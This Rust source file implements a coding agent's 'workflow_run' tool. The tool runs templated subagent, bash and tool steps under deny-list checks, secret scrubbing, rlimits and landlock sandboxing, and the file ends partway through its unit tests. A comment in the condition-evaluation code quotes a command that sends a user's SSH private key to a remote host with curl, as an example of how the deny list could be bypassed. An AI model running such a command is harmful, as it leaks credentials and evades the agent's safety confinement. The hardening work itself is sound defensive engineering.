//! `workflow_run` tool: invoke a `kf-workflow` template as a tool
//! call so the agent loop and the bench harness can run workflows the
//! same way the TUI `/workflow run` slash command does.
//!
//! Mirrors `src/tools/task.rs`: the tool holds no state of its own; it
//! borrows a `StepRunner` from the `ToolContext`'s `task_spawner` (wrapped
//! by `TaskSpawnerStepRunner`) and delegates execution to
//! `WorkflowExecutor::run` from the `kf-workflow` crate.
//!
//! The workflow crate is always compiled into the binary (not feature
//! gated — see root `Cargo.toml`), so this tool is registered
//! unconditionally in `all_tools()`. When `ctx.task_spawner` is `None`
//! (e.g. inside a sandboxed bench run that does not wire up a spawner),
//! the tool returns `ToolOutcome::Error` rather than silently no-op'ing.

use crate::session::bash_runner::{
    cap_to_string, drain_capped, model_command_path, scrub_secrets_from_child_env, setup_rlimits,
    shell_program, MAX_BASH_OUTPUT_BYTES,
};
#[cfg(windows)]
use crate::session::process_group::assign_child_to_job;
use crate::session::process_group::{kill_process_group, reap_child, setup_process_group};
use crate::shared::access::{DenyList, PathGuard};
use crate::shared::bash_safety::check_bash_command_str;
use crate::shared::{SandboxConfig, ToolDef, ToolError, ToolOutcome};
use crate::tools::task::TaskSpawner;
use crate::tools::toolset::{CompositeToolset, Toolset};
use crate::tools::{Tool, ToolContext};
use anyhow::{bail, Context, Result};
use kf_workflow::{StepOutput, StepRequest, StepRunner, Workflow, WorkflowExecutor};
use std::collections::HashMap;
use std::path::PathBuf;
use std::process::Stdio;
use std::sync::Arc;
use std::time::Duration;
use tokio_util::sync::CancellationToken;

/// `workflow_run` tool. Stateless: every invocation resolves a template
/// by name, interpolates `${var}` tokens into step prompts, and runs the
/// workflow via the `StepRunner` adapted from `ctx.task_spawner`.
pub struct WorkflowTool {
    deny_list: DenyList,
    path_guard: PathGuard,
    bash_sandbox_workdir: bool,
    // WO 47.25: spawn hardening for workflow bash steps + condition evals —
    // the same config the foreground bash tool passes to
    // `run_shell_with_token`. Populated after construction (WO 27.1
    // pattern) so `new`'s arity and its test call sites stay unchanged.
    pub(crate) sandbox_config: SandboxConfig,
    // Operator landlock allow-list extras (config
    // `security.landlock_extra_paths`), granted full r/w in the sandbox.
    pub(crate) landlock_extra_paths: Vec<PathBuf>,
}

#[allow(clippy::new_without_default)]
impl WorkflowTool {
    pub fn new(deny_list: DenyList, path_guard: PathGuard, bash_sandbox_workdir: bool) -> Self {
        Self {
            deny_list,
            path_guard,
            bash_sandbox_workdir,
            sandbox_config: SandboxConfig::default(),
            landlock_extra_paths: Vec::new(),
        }
    }
}

#[async_trait::async_trait]
impl Tool for WorkflowTool {
    fn def(&self) -> ToolDef {
        ToolDef {
            name: "workflow_run",
            description: "Run a named workflow template (a JSON DAG of persona-driven steps) \
            and return the per-step summaries as JSON. Templates are resolved from \
            `.kf-code/workflows/<template>.json` or \
            `~/.local/share/kf-code/workflows/<template>.json`. `${var}` tokens in step \
            prompts are interpolated from the `vars` map. Each step runs as an isolated \
            subagent under the persona declared in the template (`explore`, `plan`, or \
            `coder`); the tool reuses the same in-process spawner as the `task` tool.",
            parameters: serde_json::json!({
                "type": "object",
                "properties": {
                    "template": {
                        "type": "string",
                        "description": "Workflow template name (file stem, no `.json` extension). \
                        Resolved from `.kf-code/workflows/<template>.json` or the user share dir."
                    },
                    "vars": {
                        "type": "object",
                        "description": "Optional interpolation map. `${name}` tokens in step \
                        prompts are replaced with the corresponding value.",
                        "additionalProperties": { "type": "string" }
                    }
                },
                "required": ["template"]
            }),
        }
    }

    async fn run(&self, ctx: &ToolContext, args: serde_json::Value) -> ToolOutcome {
        let template = match args.get("template").and_then(|t| t.as_str()) {
            Some(t) if !t.trim().is_empty() => t.trim().to_string(),
            _ => {
                return ToolOutcome::Failure(ToolError::invalid_args(
                    "Missing or empty 'template' argument",
                ));
            }
        };

        let vars: HashMap<String, String> = args
            .get("vars")
            .and_then(|v| v.as_object())
            .map(|obj| {
                obj.iter()
                    .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                    .collect()
            })
            .unwrap_or_default();

        let spawner = match &ctx.task_spawner {
            Some(s) => s.clone(),
            None => {
                return ToolOutcome::Error {
                    message: "workflow_run requires a task spawner, which is not available in \
                    this context"
                        .to_string(),
                };
            }
        };

        match run_workflow(WorkflowRunArgs {
            template: &template,
            vars: &vars,
            spawner,
            toolset: ctx.tools.clone(),
            cancel_token: ctx.token.clone(),
            dry_run: ctx.dry_run,
            deny_list: &self.deny_list,
            path_guard: &self.path_guard,
            bash_sandbox_workdir: self.bash_sandbox_workdir,
            sandbox_config: self.sandbox_config.clone(),
            landlock_extra_paths: self.landlock_extra_paths.clone(),
            run_id: ctx.run_id.clone(),
        })
        .await
        {
            Ok(json) => ToolOutcome::Success { content: json },
            Err(e) => ToolOutcome::Error {
                message: format!("workflow '{template}' failed: {e}"),
            },
        }
    }
}

// Bundles the 9 args to `run_workflow` so the signature stays under
// clippy::too_many_arguments. Single caller: `WorkflowTool::run`. No
// behavior change — pure parameter grouping.
struct WorkflowRunArgs<'a> {
    template: &'a str,
    vars: &'a HashMap<String, String>,
    spawner: Arc<dyn TaskSpawner>,
    toolset: Option<Arc<CompositeToolset>>,
    cancel_token: CancellationToken,
    dry_run: bool,
    deny_list: &'a DenyList,
    path_guard: &'a PathGuard,
    bash_sandbox_workdir: bool,
    // WO 47.25: sandbox for bash steps + condition evals (parity with the
    // foreground bash tool). Owned — cloned once per tool call.
    sandbox_config: SandboxConfig,
    landlock_extra_paths: Vec<PathBuf>,
    // WO 45.1/46.14: canonical session run_id threaded from ToolContext.
    run_id: Option<String>,
}

async fn run_workflow(args: WorkflowRunArgs<'_>) -> Result<String> {
    let WorkflowRunArgs {
        template,
        vars,
        spawner,
        toolset,
        cancel_token,
        dry_run,
        deny_list,
        path_guard,
        bash_sandbox_workdir,
        sandbox_config,
        landlock_extra_paths,
        run_id,
    } = args;
    let path = kf_workflow::find_workflow_file(template)
        .with_context(|| format!("workflow template '{template}' not found"))?;
    let raw = std::fs::read(&path).with_context(|| format!("failed to read {}", path.display()))?;
    let mut workflow = Workflow::from_json(&raw)?;
    interpolate_vars(&mut workflow, vars);

    let executor = WorkflowExecutor::new(workflow).with_run_id(run_id);
    let runner = TaskSpawnerStepRunner {
        spawner,
        toolset,
        deny_list: deny_list.clone(),
        path_guard: path_guard.clone(),
        bash_sandbox_workdir,
        sandbox_config,
        landlock_extra_paths,
        cancel_token,
        dry_run,
    };
    let summary = executor.run(std::sync::Arc::new(runner), None).await?;
    Ok(summary_to_json(&summary))
}

/// Replace `${name}` tokens in every step's `prompt`, `command`, and `over`
/// fields with the value from `vars`. Unknown tokens are left intact (so
/// partial interpolation is a warning, not an error — the workflow can still
/// run and the model will see the literal `${name}` in the prompt).
///
/// `$(step_name.field)` references are NOT resolved here — they require runtime
/// step outputs and are handled by `kf_workflow::resolve_step_refs` inside the
/// executor.
pub fn interpolate_vars(workflow: &mut Workflow, vars: &HashMap<String, String>) {
    if vars.is_empty() {
        return;
    }
    for step in &mut workflow.steps {
        if let Some(ref mut prompt) = step.prompt {
            for (k, v) in vars {
                *prompt = prompt.replace(&format!("${{{k}}}"), v);
            }
        }
        if let Some(ref mut command) = step.command {
            for (k, v) in vars {
                *command = command.replace(&format!("${{{k}}}"), v);
            }
        }
        if let Some(ref mut over) = step.over {
            for (k, v) in vars {
                *over = over.replace(&format!("${{{k}}}"), v);
            }
        }
    }
}

/// Render a `WorkflowSummary` as compact JSON for the model. The workflow
/// crate's `WorkflowSummary` carries outputs in a `HashMap` (non-
/// deterministic iteration), so we sort step names alphabetically for a
/// stable, comparable result. The crate does not expose the original
/// declaration order on the summary, so alphabetical is the honest
/// stable choice.
pub fn summary_to_json(summary: &kf_workflow::WorkflowSummary) -> String {
    let mut names: Vec<&String> = summary.outputs.keys().collect();
    names.sort();
    let steps: Vec<&StepOutput> = names
        .iter()
        .filter_map(|n| summary.outputs.get(*n))
        .collect();
    serde_json::json!({
        "workflow": summary.workflow_name,
        "budget_exceeded": summary.budget_exceeded,
        "steps": steps.iter().map(|s| serde_json::json!({
            "name": s.name,
            "kind": format!("{:?}", s.kind).to_lowercase(),
            "persona": s.persona,
            "summary": s.summary,
            "critique": s.critique,
            "structured_output": s.structured_output,
        })).collect::<Vec<_>>()
    })
    .to_string()
}

/// Step-level timeout for workflow bash steps. Mirrors the foreground
/// bash tool's default 30s (`bash.rs`), since template bash steps should
/// be quick build/grep style commands — anything longer is a hang, not
/// slowness. `ceiling:` a template that genuinely needs longer should
/// surface a per-step timeout knob on `Step`; upgrade path is a
/// `step.timeout_secs` field.
const WORKFLOW_BASH_TIMEOUT_SECS: u64 = 30;

/// Outcome of a bounded workflow bash spawn. Distinguishes timeout and
/// cancellation from a normal exit so the caller can produce a
/// step-specific error message.
enum BashOutcome {
    Output {
        stdout: String,
        stderr: String,
        status: std::process::ExitStatus,
    },
    SpawnError(std::io::Error),
    Timeout,
    Cancelled,
}

/// Apply the pre-spawn hardening shared by workflow bash steps and
/// condition evals — the same construction `run_shell_with_token`
/// (`bash_runner/mod.rs`) applies to the foreground bash tool: secret env
/// scrub, PATH pin, process group, and the `setup_rlimits` pre_exec
/// (rlimits + landlock FS confinement + optional CLONE_NEWNET). WO 47.25:
/// one sandboxed-shell-spawn path for both spawn sites, not two with
/// diverging guarantees. The landlock workspace is the process CWD
/// (workflow spawns inherit it; the foreground tool uses its workdir the
/// same way).
fn prepare_workflow_shell_cmd(
    cmd: &mut tokio::process::Command,
    sandbox: &SandboxConfig,
    landlock_extra_paths: &[PathBuf],
) {
    cmd.env("PATH", model_command_path());
    scrub_secrets_from_child_env(cmd);
    setup_process_group(cmd);
    #[cfg(target_os = "linux")]
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
    #[cfg(target_os = "linux")]
    let lp = crate::session::bash_runner::resolve_paths(&cwd, landlock_extra_paths);
    #[cfg(not(target_os = "linux"))]
    let lp: Option<()> = {
        let _ = landlock_extra_paths;
        None
    };
    setup_rlimits(cmd, sandbox, lp);
}

/// Spawn `sh -c <command>` with `kill_on_drop`, bounded by both a wall
/// timeout and the workflow cancel token. On timeout or cancel the child
/// process tree is killed (Unix process group / Windows Job Object) and
/// the `Child` is dropped, and `kill_on_drop` reaps the direct child.
///
/// WO 44.44: this path inherits the same hardening as the foreground
/// `run_shell_with_token` (`bash_runner/mod.rs`): secret env scrub, PATH
/// pin, capped output drain (`MAX_BASH_OUTPUT_BYTES`), and process-tree
/// kill (Unix `killpg` / Windows Job Object). Previously it buffered the
/// whole stream via `wait_with_output()` with no cap and no env scrub.
/// WO 47.25: rlimits + landlock FS confinement added via
/// `prepare_workflow_shell_cmd` — full parity with the foreground tool.
async fn run_bounded_bash(
    command: &str,
    cancel_token: &CancellationToken,
    sandbox: &SandboxConfig,
    landlock_extra_paths: &[PathBuf],
) -> BashOutcome {
    let mut cmd = tokio::process::Command::new(shell_program());
    cmd.arg("-c")
        .arg(command)
        .kill_on_drop(true)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    prepare_workflow_shell_cmd(&mut cmd, sandbox, landlock_extra_paths);

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => return BashOutcome::SpawnError(e),
    };
    // Windows: wrap the child in a Job Object so a later drop kills the
    // whole process tree (no process-group kill on Windows). Unix uses
    // killpg via kill_process_group below.
    #[cfg(windows)]
    let _job = assign_child_to_job(&child);

    let stdout = child.stdout.take().expect("piped stdout");
    let stderr = child.stderr.take().expect("piped stderr");
    let drain_stdout = tokio::spawn(drain_capped(stdout, MAX_BASH_OUTPUT_BYTES));
    let drain_stderr = tokio::spawn(drain_capped(stderr, MAX_BASH_OUTPUT_BYTES));

    let timeout_at = tokio::time::Instant::now() + Duration::from_secs(WORKFLOW_BASH_TIMEOUT_SECS);
    // Internal discriminant for the select's Err arm only (not the public
    // BashOutcome): distinguishes timeout from cancel without reusing the
    // public enum, which also carries Output/SpawnError that can't be errors.
    enum KillReason {
        Timeout,
        Cancelled,
    }
    let status_result = tokio::select! {
        biased;
        result = child.wait() => Ok(result),
        _ = tokio::time::sleep_until(timeout_at) => Err(KillReason::Timeout),
        _ = cancel_token.cancelled() => Err(KillReason::Cancelled),
    };

    match status_result {
        Ok(Ok(status)) => {
            let (raw_out, dropped_out) = join_drain(drain_stdout).await;
            let (raw_err, dropped_err) = join_drain(drain_stderr).await;
            BashOutcome::Output {
                stdout: cap_to_string(raw_out, dropped_out),
                stderr: cap_to_string(raw_err, dropped_err),
                status,
            }
        }
        Ok(Err(e)) => BashOutcome::SpawnError(e),
        Err(KillReason::Timeout) => {
            // Kill the process tree so the drain tasks see EOF and the
            // pipes close. Unix: killpg the whole group. Windows: drop the
            // JobGuard (KILL_ON_JOB_CLOSE) — it goes out of scope here.
            kill_process_group(&mut child);
            reap_child(&mut child, Duration::from_secs(2)).await;
            BashOutcome::Timeout
        }
        Err(KillReason::Cancelled) => {
            kill_process_group(&mut child);
            reap_child(&mut child, Duration::from_secs(2)).await;
            BashOutcome::Cancelled
        }
    }
}

/// Join a drain task with a bounded timeout. Returns the bytes + dropped
/// count, or empty buffers if the join failed (the kill already ran, so
/// partial output is best-effort). Mirrors `bash_runner::join_drain` but
/// inline because workflow bash doesn't surface a `ShellError::Drain` —
/// a stuck drainer is folded into the (possibly empty) output.
async fn join_drain(
    handle: tokio::task::JoinHandle<std::io::Result<(Vec<u8>, u64)>>,
) -> (Vec<u8>, u64) {
    match tokio::time::timeout(Duration::from_secs(5), handle).await {
        Ok(Ok(Ok(pair))) => pair,
        _ => (Vec::new(), 0),
    }
}

/// Adapter that presents a `TaskSpawner` as a `StepRunner`. Each agent step
/// becomes a `TaskRequest` with the step's persona; bash steps run via
/// `tokio::process::Command`; tool steps are dispatched via the tool registry.
/// `run_batch` fans out independent steps in parallel via `tokio::spawn`.
pub struct TaskSpawnerStepRunner {
    pub spawner: Arc<dyn TaskSpawner>,
    /// Optional tool registry for dispatching `tool` steps by name.
    /// When `None`, tool steps bail (bench/sandbox context).
    pub toolset: Option<Arc<CompositeToolset>>,
    pub deny_list: DenyList,
    pub path_guard: PathGuard,
    pub bash_sandbox_workdir: bool,
    /// WO 47.25: sandbox applied to workflow bash steps AND condition
    /// evals (same config the foreground bash tool uses).
    pub sandbox_config: SandboxConfig,
    /// Operator landlock allow-list extras, granted full r/w.
    pub landlock_extra_paths: Vec<PathBuf>,
    pub cancel_token: CancellationToken,
    pub dry_run: bool,
}

// WO 48.32: derive the TaskCancel pair for a workflow agent step, cascaded
// from the runner's token — Esc / a job timeout fires the runner token and
// now stops the subagent LLM loop (flag between turns, token in-flight)
// the same way bash/tool steps already honour it. Same bridge as the
// foreground `task` tool (task_tool.rs); `done` retires the watcher when
// the step finishes normally so watchers don't pile up per step.
fn bridged_task_cancel(
    parent: &CancellationToken,
) -> (crate::tools::task::TaskCancel, Arc<tokio::sync::Notify>) {
    let cancel = crate::tools::task::TaskCancel {
        flag: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        token: CancellationToken::new(),
    };
    let done = Arc::new(tokio::sync::Notify::new());
    crate::tools::task::cascade_parent_cancel(parent.clone(), cancel.clone(), done.clone());
    (cancel, done)
}

#[async_trait::async_trait]
impl StepRunner for TaskSpawnerStepRunner {
    async fn run_step(&self, name: &str, prompt: &str, persona: &str) -> Result<String> {
        let (cancel, done) = bridged_task_cancel(&self.cancel_token);
        let result = self
            .spawner
            .run_task(crate::tools::task::TaskRequest {
                // WO 35.1: callers own the persona preamble — run_task is
                // verbatim now.
                prompt: crate::tools::task::build_task_prompt(persona, prompt),
                persona: persona.to_string(),
                model: None,
                max_turns: 1,
                cancel: Some(cancel),
                owner: None,
                subagent_depth: 0,
                pending_messages: None,
            })
            .await
            .map_err(|e| anyhow::anyhow!("step '{name}' failed: {e}"));
        done.notify_waiters();
        result
    }

    async fn run_bash(&self, name: &str, command: &str) -> Result<String> {
        if let Some(denied) = check_bash_command_str(
            command,
            None,
            &self.deny_list,
            &self.path_guard,
            self.bash_sandbox_workdir,
        ) {
            bail!("step '{name}': bash command denied: {denied}");
        }
        let output = run_bounded_bash(
            command,
            &self.cancel_token,
            &self.sandbox_config,
            &self.landlock_extra_paths,
        )
        .await;
        match output {
            BashOutcome::Output {
                stdout,
                stderr,
                status,
            } => {
                if !status.success() {
                    bail!(
                        "step '{name}': bash exited {} — stderr: {}",
                        status
                            .code()
                            .map(|c| c.to_string())
                            .unwrap_or_else(|| "signal".into()),
                        stderr.trim()
                    );
                }
                Ok(format!("{stdout}{stderr}").trim_end().to_string())
            }
            BashOutcome::SpawnError(e) => Err(e)
                .with_context(|| format!("step '{name}': failed to spawn bash for: {command}")),
            BashOutcome::Timeout => {
                bail!("step '{name}': bash timed out after {WORKFLOW_BASH_TIMEOUT_SECS}s")
            }
            BashOutcome::Cancelled => bail!("step '{name}': bash cancelled"),
        }
    }

    async fn run_tool(
        &self,
        name: &str,
        tool_name: &str,
        arguments: &serde_json::Value,
    ) -> Result<String> {
        let toolset = self
            .toolset
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("step '{name}': tool steps require a tool registry, which is not available in this context (tool: '{tool_name}')"))?;
        let tool = toolset
            .resolve(tool_name)
            .ok_or_else(|| anyhow::anyhow!("step '{name}': unknown tool '{tool_name}'"))?;
        let ctx = ToolContext {
            token: self.cancel_token.child_token(),
            dry_run: self.dry_run,
            task_spawner: Some(self.spawner.clone()),
            tools: Some(toolset.clone()),
            subagent_depth: 0,
            ..Default::default()
        };
        match tool.run(&ctx, arguments.clone()).await {
            ToolOutcome::Success { content } => Ok(content),
            ToolOutcome::Failure(ToolError::InvalidArgs { message }) => Err(anyhow::anyhow!(
                "step '{name}': tool '{tool_name}' invalid args: {message}"
            )),
            ToolOutcome::Error { message } => Err(anyhow::anyhow!(
                "step '{name}': tool '{tool_name}' error: {message}"
            )),
            other => Err(anyhow::anyhow!(
                "step '{name}': tool '{tool_name}' returned unexpected outcome: {other:?}",
            )),
        }
    }

    // Route the condition string through the same deny gate the runner
    // applies to bash steps — conditions are the only other `sh -c` spawn
    // site in the workflow path, so they must not bypass the gate. A denied
    // condition is treated as `false` (skip) + warn, matching timeout/ spawn-
    // failure semantics: a skipped step is recoverable, a wedged workflow is
    // not.
    //
    // WO 47.25: the spawn itself goes through `prepare_workflow_shell_cmd`
    // (rlimits + landlock pre_exec) via the lib's prepare hook, so the
    // condition `sh -c` gets the same kernel-level confinement as a bash
    // step — deny-list pattern-matching alone was bypassable (e.g.
    // `test -f ~/.ssh/id_rsa && curl -s host -d @~/.ssh/id_rsa`).
    async fn eval_condition(&self, condition: &str) -> bool {
        if let Some(denied) = check_bash_command_str(
            condition,
            None,
            &self.deny_list,
            &self.path_guard,
            self.bash_sandbox_workdir,
        ) {
            tracing::warn!("condition denied: {denied} — skipping step");
            return false;
        }
        let sandbox = self.sandbox_config.clone();
        let extra = self.landlock_extra_paths.clone();
        let prep = move |cmd: &mut tokio::process::Command| {
            prepare_workflow_shell_cmd(cmd, &sandbox, &extra);
        };
        kf_workflow::eval_condition_bounded(condition, Some(&prep)).await
    }

    async fn run_batch(&self, steps: Vec<StepRequest>) -> Result<Vec<(String, String)>> {
        // Fan out independent steps in parallel. Each step is dispatched to
        // its own tokio task so they run concurrently. We join ALL handles
        // before returning (never early-return on the first error) so a
        // failed step does not drop its siblings' JoinHandles — detached
        // subagent tasks would keep running (LLM turns, token spend) with
        // results discarded. On any failure we return `BatchErrors` carrying
        // both successes and failures so the executor can preserve the
        // succeeded siblings' outputs.
        let mut handles: Vec<(String, tokio::task::JoinHandle<Result<(String, String)>>)> =
            Vec::with_capacity(steps.len());
        for req in steps {
            let spawner = self.spawner.clone();
            let toolset = self.toolset.clone();
            let cancel_token = self.cancel_token.child_token();
            let dry_run = self.dry_run;
            let deny_list = self.deny_list.clone();
            let path_guard = self.path_guard.clone();
            let bash_sandbox_workdir = self.bash_sandbox_workdir;
            let sandbox_config = self.sandbox_config.clone();
            let landlock_extra_paths = self.landlock_extra_paths.clone();
            let name = req.name.clone();
            let handle = tokio::spawn(async move {
                match req.kind {
                    kf_workflow::StepKind::Agent => {
                        let (cancel, done) = bridged_task_cancel(&cancel_token);
                        let result = spawner
                            .run_task(crate::tools::task::TaskRequest {
                                prompt: crate::tools::task::build_task_prompt(
                                    &req.persona,
                                    &req.prompt,
                                ),
                                persona: req.persona,
                                model: None,
                                max_turns: 1,
                                cancel: Some(cancel),
                                owner: None,
                                subagent_depth: 0,
                                pending_messages: None,
                            })
                            .await
                            .map_err(|e| anyhow::anyhow!("step '{}' failed: {e}", req.name));
                        done.notify_waiters();
                        let result = result?;
                        Ok::<(String, String), anyhow::Error>((req.name, result))
                    }
                    kf_workflow::StepKind::Bash => {
                        if let Some(denied) = check_bash_command_str(
                            &req.command,
                            None,
                            &deny_list,
                            &path_guard,
                            bash_sandbox_workdir,
                        ) {
                            bail!("step '{}': bash command denied: {denied}", req.name);
                        }
                        match run_bounded_bash(
                            &req.command,
                            &cancel_token,
                            &sandbox_config,
                            &landlock_extra_paths,
                        )
                        .await
                        {
                            BashOutcome::Output {
                                stdout,
                                stderr,
                                status,
                            } => {
                                if !status.success() {
                                    bail!(
                                        "step '{}': bash exited {} — stderr: {}",
                                        req.name,
                                        status
                                            .code()
                                            .map(|c| c.to_string())
                                            .unwrap_or_else(|| "signal".into()),
                                        stderr.trim()
                                    );
                                }
                                Ok((req.name, format!("{stdout}{stderr}").trim_end().to_string()))
                            }
                            BashOutcome::SpawnError(e) => Err(e).with_context(|| {
                                format!(
                                    "step '{}': failed to spawn bash for: {}",
                                    req.name, req.command
                                )
                            }),
                            BashOutcome::Timeout => bail!(
                                "step '{}': bash timed out after {WORKFLOW_BASH_TIMEOUT_SECS}s",
                                req.name
                            ),
                            BashOutcome::Cancelled => bail!("step '{}': bash cancelled", req.name),
                        }
                    }
                    kf_workflow::StepKind::Tool => {
                        let toolset = toolset.as_ref().ok_or_else(|| {
                            anyhow::anyhow!(
                                "step '{}': tool steps require a tool registry, which is not available in this context (tool: '{}')",
                                req.name, req.tool_name
                            )
                        })?;
                        let tool = toolset.resolve(&req.tool_name).ok_or_else(|| {
                            anyhow::anyhow!("step '{}': unknown tool '{}'", req.name, req.tool_name)
                        })?;
                        let ctx = ToolContext {
                            token: cancel_token,
                            dry_run,
                            task_spawner: Some(spawner),
                            tools: Some(toolset.clone()),
                            subagent_depth: 0,
                            ..Default::default()
                        };
                        match tool.run(&ctx, req.tool_arguments.clone()).await {
                            ToolOutcome::Success { content } => Ok((req.name, content)),
                            ToolOutcome::FileContent { content, .. } => Ok((req.name, content)),
                            ToolOutcome::FileEdit { diff, .. } => Ok((req.name, diff)),
                            ToolOutcome::GrepMatches { total, .. } => {
                                Ok((req.name, format!("{total} grep matches")))
                            }
                            ToolOutcome::Image { path, .. } => {
                                Ok((req.name, format!("image: {}", path.display())))
                            }
                            ToolOutcome::Failure(ToolError::InvalidArgs { message }) => {
                                Err(anyhow::anyhow!(
                                    "step '{}': tool '{}' invalid args: {message}",
                                    req.name,
                                    req.tool_name
                                ))
                            }
                            ToolOutcome::Error { message } => Err(anyhow::anyhow!(
                                "step '{}': tool '{}' error: {message}",
                                req.name,
                                req.tool_name
                            )),
                            _outcome => Err(anyhow::anyhow!(
                                "step '{}': tool '{}' returned unexpected outcome",
                                req.name,
                                req.tool_name
                            )),
                        }
                    }
                    kf_workflow::StepKind::FanOut | kf_workflow::StepKind::FanIn => {
                        // Fan-out/fan-in steps are expanded before execution;
                        // they should not reach this match arm.
                        bail!(
                            "step '{}': fan-out/fan-in steps should be expanded before execution",
                            req.name
                        )
                    }
                }
            });
            handles.push((name, handle));
        }

        // Join ALL handles — never early-return on the first error, so a
        // failed step does not drop its siblings' JoinHandles (detached
        // subagent tasks would keep running with results discarded).
        let mut successes = Vec::with_capacity(handles.len());
        let mut failures: Vec<(String, anyhow::Error)> = Vec::new();
        for (name, h) in handles {
            match h.await {
                Ok(Ok(pair)) => successes.push(pair),
                Ok(Err(e)) => failures.push((name, e)),
                Err(e) => failures.push((name, anyhow::anyhow!("batch task panicked: {e}"))),
            }
        }
        if failures.is_empty() {
            Ok(successes)
        } else {
            Err(anyhow::Error::from(kf_workflow::BatchErrors {
                successes,
                failures,
            }))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::shared::test_util::CwdGuard;
    use crate::tools::task::TaskRequest;
    use crate::tools::ToolContext;
    use std::sync::Mutex as StdMutex;

    /// Spawner that echoes the prompt back as the summary. Records every
    /// call so tests can assert on persona + interpolated prompt.
    struct EchoSpawner {
        calls: Arc<StdMutex<Vec<(String, String)>>>,
    }

    #[async_trait::async_trait]
    impl TaskSpawner for EchoSpawner {
        async fn run_task(&self, request: TaskRequest) -> Result<String, String> {
            self.calls
                .lock()
                .unwrap()
                .push((request.persona.clone(), request.prompt.clone()));
            Ok(format!("summary:{}", request.prompt))
        }
    }

    fn write_template(dir: &std::path::Path, name: &str, body: &str) {
        let wf_dir = dir.join(".kf-code/workflows");
        std::fs::create_dir_all(&wf_dir).unwrap();
        std::fs::write(wf_dir.join(format!("{name}.json")), body).unwrap();
    }

    /// Helper to build an agent step with minimal fields.
    fn agent_step(name: &str, prompt: &str, persona: &str) -> kf_workflow::Step {
        kf_workflow::Step {
            name: name.into(),
            kind: kf_workflow::StepKind::Agent,
            prompt: Some(prompt.into()),
            persona: Some(persona.into()),
            command: None,
            tool_name: None,
            tool_arguments: None,
            depends_on: vec![],
            critique: None,
            condition: None,
            on_error: None,
            fork_from: None,
            over: None,
            as_name: None,
            max_parallel: None,
        }
    }

    #[test]
    fn def_name_and_required_template() {
        let t = WorkflowTool::new(DenyList::default(), PathGuard::default(), false);
        let def = t.def();
        assert_eq!(def.name, "workflow_run");
        let required = def
            .parameters
            .get("required")
            .and_then(|r| r.as_array())
            .expect("required array");
        assert!(required.iter().any(|v| v.as_str() == Some("template")));
    }

    #[tokio::test]
    async fn missing_template_arg_is_failure() {
        let t = WorkflowTool::new(DenyList::default(), PathGuard::default(), false);
        let ctx = ToolContext::new();
        let out = t.run(&ctx, serde_json::json!({})).await;
        assert!(
            matches!(out, ToolOutcome::Failure(ToolError::InvalidArgs { .. })),
            "got {out:?}"
        );
    }

    #[tokio::test]
    async fn no_spawner_is_error() {
        let t = WorkflowTool::new(DenyList::default(), PathGuard::default(), false);
        let ctx = ToolContext::new();
        let out = t
            .run(&ctx, serde_json::json!({"template": "feature"}))
            .await;
        assert!(matches!(out, ToolOutcome::Error { .. }), "got {out:?}");
    }

    #[tokio::test]
    async fn runs_workflow_and_interpolates_vars() {
        let tmp = tempfile::tempdir().unwrap();
        write_template(
            tmp.path(),
            "demo",
            r#"{"name":"demo","steps":[
                {"name":"explore","prompt":"Map ${feature}","persona":"explore"},
                {"name":"plan","prompt":"Design ${feature}","persona":"plan","depends_on":["explore"]}
            ]}"#,
        );
        let _cwd = CwdGuard::set(tmp.path()).await;

        let calls = Arc::new(StdMutex::new(Vec::new()));
        let spawner: Arc<dyn TaskSpawner> = Arc::new(EchoSpawner {
            calls: calls.clone(),
        });
        let ctx = ToolContext::with_spawner(spawner);

        let t = WorkflowTool::new(DenyList::default(), PathGuard::default(), false);
        let out = t
            .run(
                &ctx,
                serde_json::json!({"template": "demo", "vars": {"feature": "auth"}}),
            )
            .await;

        let content = match out {
            ToolOutcome::Success { content } => content,
            other => panic!("expected Success, got {other:?}"),
        };
        let parsed: serde_json::Value = serde_json::from_str(&content).unwrap();
        assert_eq!(parsed["workflow"], "demo");
        assert_eq!(parsed["steps"][0]["name"], "explore");
        assert_eq!(parsed["steps"][0]["persona"], "explore");
        assert!(parsed["steps"][0]["summary"]
            .as_str()
            .unwrap()
            .contains("auth"));
        assert_eq!(parsed["steps"][1]["name"], "plan");

        let recorded = calls.lock().unwrap();
        assert_eq!(recorded[0].0, "explore");
        assert!(recorded[0].1.contains("Map auth"));
        assert!(!recorded[0].1.contains("${feature}"));
        assert_eq!(recorded[1].0, "plan");
        // plan depends on explore → its prompt carries the explore summary.
        assert!(recorded[1].1.contains("Context from previous steps"));
    }

    #[tokio::test]
    async fn unknown_template_returns_error() {
        let tmp = tempfile::tempdir().unwrap();
        let _cwd = CwdGuard::set(tmp.path()).await;
        let spawner: Arc<dyn TaskSpawner> = Arc::new(EchoSpawner {
            calls: Arc::new(StdMutex::new(Vec::new())),
        });
        let ctx = ToolContext::with_spawner(spawner);
        let out = WorkflowTool::new(DenyList::default(), PathGuard::default(), false)
            .run(&ctx, serde_json::json!({"template": "nope"}))
            .await;
        match out {
            ToolOutcome::Error { message } => assert!(message.contains("not found")),
            other => panic!("expected Error, got {other:?}"),
        }
    }

    #[test]
    fn interpolate_vars_replaces_known_tokens() {
        let mut wf = Workflow {
            name: "x".into(),
            steps: vec![agent_step("a", "do ${thing} and ${unknown}", "explore")],
            budget: None,
        };
        let mut vars = HashMap::new();
        vars.insert("thing".to_string(), "X".to_string());
        interpolate_vars(&mut wf, &vars);
        assert_eq!(wf.steps[0].prompt.as_ref().unwrap(), "do X and ${unknown}");
    }

    #[test]
    fn interpolate_vars_empty_map_is_noop() {
        let mut wf = Workflow {
            name: "x".into(),
            steps: vec![agent_step("a", "do ${thing}", "explore")],
            budget: None,
        };
        interpolate_vars(&mut wf, &HashMap::new());
        assert_eq!(wf.steps[0].prompt.as_ref().unwrap(), "do ${thing}");
    }

    #[test]
    fn interpolate_vars_replaces_multiple_known_tokens() {
        let mut wf = Workflow {
            name: "x".into(),
            steps: vec![agent_step("a", "do ${thing} then ${other}", "explore")],
            budget: None,
        };
        let mut vars = HashMap::new();
        vars.insert("thing".to_string(), "X".to_string());
        vars.insert("other".to_string(), "Y".to_string());
